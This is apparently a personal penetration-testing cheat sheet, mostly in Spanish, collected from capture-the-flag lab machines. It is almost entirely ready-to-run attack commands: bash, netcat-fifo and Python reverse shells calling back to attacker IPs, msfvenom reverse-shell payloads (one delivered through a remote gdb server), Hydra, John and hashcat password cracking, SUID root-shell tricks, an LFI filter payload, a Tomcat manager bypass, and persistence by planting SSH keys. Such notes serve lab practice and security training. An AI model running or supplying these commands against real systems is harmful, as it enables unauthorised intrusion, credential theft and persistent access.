find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null



php://filter/convert.base64-encode/resource=dog/../index

#crear una shell estable 
 python -c "import pty; pty.spawn('/bin/bash')"
 python3 -c "import pty; pty.spawn('/bin/bash')"
ctl+z
stty raw -echo
fg
fg
export TERM=xterm-256color

#hydra brute force
hydra -l <username> -P <full path to pass> <ip> -t 4 ssh
hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect"
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
#ver permisos de sudo sin pass
sudo -l

sudo -u user binario

#enum samba  NMAP 
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.221.188

#buscar exploit 
searchsploit NOMBRE_SERVIDOR

#enumerar nfs
showmount -e 10.10.130.57

##pgp
#Agregar una public key 
gpg --import root@harder.local.pub 
#Listar la pk
gpg --list-public-keys
#encryptar la pk 
gpg -e  -o salida.asc -r root@harder.local /tmp/comando 


#crack sshkey 
python /usr/share/john/ssh2john.py secretKey > id_rsa.hash
john id_rsa.hash -wordlist=dict
john id_rsa.hash --show

##priv elevation python  uid
python -c 'import os; os.execl("/bin/sh","sh","-p")'

##reverse shell bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1



##crack steghhide
stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt 


##Crack .zip
fcrackzip -v -D -u -p /usr/share/dict/words secret.zip


##Fuzzyng 

##Directory
	wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt

##User / PASS 
	wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php


#Subir kkeys
#1) crear la ssh key en tu pc
ssh-keygen -f user
#2) moverla con servidor http
mover a ~/.ssh
cat key.pub > authorized_keys
#3) la usas con 
ssh -i apaar user@ip
#4) =)


##Haciendo rev shell
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.103.90 1234 >/tmp/f
nc -lvp 1234

##Tunel ssh reverso

ssh -i apaar -L 9002:127.0.0.1:9001 apaar@10.10.241.107

## Tunnel 

##Reconocimiento ftp
use auxiliary/scanner/ftp/anonymous


binwalk --dd='.*' FILE



python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.103.90",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#cewl diccionario de una pagina web
cewl -m 6 -a-e -v -w urlDic url

#xml a html 
     xsltproc <nmap-output.xml> -o <nmap-output.html> 

# SMB client
## map
smbmap -R -H hogwartz-castle.thm
## get data
smbclient //hogwartz-castle.thm/sambashare -U anonymous 
## Muestra los dominios del SMB  
smbclient -N -L //ip
## accedemos a un dominio




## Revshell msfvenom

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

## By pass tomcat manager 
 	https://10.10.10.250/manager/status/..;/html

## XML RPC 
### Enumeracion de xmlrpc.php

#### ver metodos 
    <methodCall>
      <methodName>system.listMethods</methodName>
      <params></params>
      </methodCall>

#### Informacion de los metodos
    <methodCall>
      <methodName>system.methodSignature</methodName>
      <params>
        <param><value>
          <string>sample.add</string>
          </value></param>
        </params>
      </methodCall>

##Vhost gobuster 

gobuster vhost forge.htb -u http://forge.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -r





##SMB ENUMERATION
SMB protocol corre sobre el protocolo netbios sobre TCP (NTB).
El servidor tiene dos servicion escuchando:
	1.- Datos almacenados
	2.- Modulo de autenticación

$ smbclient -L ip
$ smbclient \\\\ip\\servicio

## RDP Remote Desktop protocol
port 3389
Tool
$xfreerdp /v:10.129.240.71 /cert:ignore /u:Administrator 


###Dominios query 
#Fishing de emails
#SPF
dig TXT dominio
#DKIM
dig DKIM selector._domainkey.dominio
#DMARC
dig txt _dmarc.dominio

##Syncronizar s3 con ec2 
aws s3 --region <your region name> sync s3://<your bucket name> /your/directory/path

##Enumeracion de vhost con dirbuster 
	$gobuster vhost -u erev0s.com -w awesome_wordlist.txt

##Fuerza bruta a un openssl salted
	bruteforce-salted-openssl -t 6 -f /usr/share/wordlists/rockyou.txt  drupal.txt -c aes-256-cbc -d sha256


##Des encriptar con openssl
openssl enc -d -aes256 -md sha256 -salt -in drupal.txt -out decrypted -k friends

#nmap enumeracion http
sudo nmap --min-rate=1000 -p80,3000 -v --script=http-enum -n -T5 -oN nmap.web.enum 10.10.10.121


##Docker remove containers 
for id in $(sudo docker ps -a | awk -F \ + '{print $1}' | grep -v CONTAINER); do sudo docker stop $id;sudo docker rm $id; done;

##Hashcat
##Hashcat md5
hashcat -m 0   user  /usr/share/wordlists/rockyou.txt


##Reverse shell rpc 
./psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178

##Password mining 
grep --color=auto -rnw './' -ie "HTB" --color=always 2>/dev/null



#Enumeracion snmp 
sudo nmap -sU  10.10.11.136 -p161 --script=snmp-brute  -Pn --script-args snmp-brute.communitiesdb=/usr/share/wordlists/SecLists-master/Discovery/SNMP/common-snmp-community-strings.txt -oN nmap.snmp

#SNMP MIB 

1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports

#Hashear un password 
mkpasswd -m sha-512 newpassword


#Ver payloads msfvenom
msfvenom -l payloads

#smb enum users
crackmapexec smb ip -u 'user' -p 'pass'

#SMB montar con credenciales 
mount -t cifs //ip/DIR /mnt/dir_montura -o username=user,password=pass,domain=WORKGROUP,rw

#SMB Listar permisos del lado del servidor, cuando haces montura
smbcacls


#Comandos de s3


##Wordpress con wpscann
wpscan --url http://backdoor.htb/ --enumerate p,u --plugins-detection aggressive

## Explotacion puerto 1337 gdb
# Creamos el payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf
# chmod +x binary.elf
​
gdb binary.elf
​
# Set remote debuger target
target extended-remote 10.10.10.11:1337
​
# Upload elf file
remote put binary.elf binary.elf
​
# Set remote executable file
set remote exec-file /home/user/binary.elf
​
# Execute reverse shell executable
run


#Transferencia de archivos http por ssl
$ pip3 install updog
$ python3 -m updog --ssl

## Verificacion de cronjobs 
pspy32

## wordpress
Enumerar usuarios de wordpress 
curl https://phoenix.htb/wp-json/wp/v2/users -k | json_pp

#wget con cookies
wget --header "Cookie: name=value" URL

#Wfuzz para LFI 
wfuzz -c --hh 11414  -L -z file,/usr/share/wordlists/SecLists-master/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt http://10.10.11.154/index.php?page=FUZZ

#Threads in python3 
import threading
def workers(x):
	pass
threads = []
for x in range(0, 300):
    t = threading.Thread(target=workers, args=(x,))
    threads.append(t)
    t.start()
    
for t in threads:
    t.join()

#Pivoting socat 
socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:22 

#Pivoting chisel 
##Chisel en cliente
git clone https://github.com/jpillora/chisel
cd chisel && CGO_ENABLED=0 go build -ldflags="-s -w"
sudo ./chisel server -p 8000 --reverse
##Chisel en servidor 
./chisel client ipTarget:TUPUERTO R:PORT:IP_LOCAL:PORT





#Metodologia
 Headers
 robots.txt
 cve
 rutas

# OpenBSD
## OpenBSD ver puertos en openbsd
sockstat -4 -l

#Persistencia con llaves ssh
##Generamos una llave publica ssh
ssh-keygen
cat /home/yo/.ssh/id_rsa.pub
##La pasamos al archivo authorized_keys
echo 'ssh-rsa contenido de id_rsa.pub....' >> /home/paul/.ssh/authorized_keys
## Cambiamos permisos 
chmod 700 /home/paul/.ssh/authorized_keys
## Nos conectamos con la llave privada que generamos
ssh -i id_rsa paul@10.10.11.148


##Tools analizar apks MobSFv33
https://mobsf.github.io/docs/#/running


## PROC jwt con valor jku
https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c

# PROC jwt jku
# Genera una llave privada rsa
openssl genrsa -out keypair.pem 2048
# Genera la llave publica 
openssl rsa -in keypair.pem -pubout -out publickey.crt
# Cambia el formato de la llave 
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key

# MobSFv Analisis de apk
 docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
 

##Bof 
# cuando el NX (No-eXecute) esta habilitado se necesita un ROP (Return oriented programming)


### Tool for webassembly wabt

### Tool curlftpfs accedder a servidor ftp

#Mostrar los timers 
systemctl list-timers

#Compilacion cruzada linux => windows Mingw-w64


## Envio archivos 
### De local a remoto
scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt

### De remoto a local
scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt 

### Repositorios apt
## Agregar repositorio
wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -

## Remover repositorio
add-apt-repository --remove ppa:PPA_Name/ppa


##Montar uin nfs remoto
sudo mount  10.10.65.64:/home /tmp/expl -nolock
## cambiar suid en c
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>

int main(){
setuid(geteuid());
system("/bin/bash");
return 0;
}












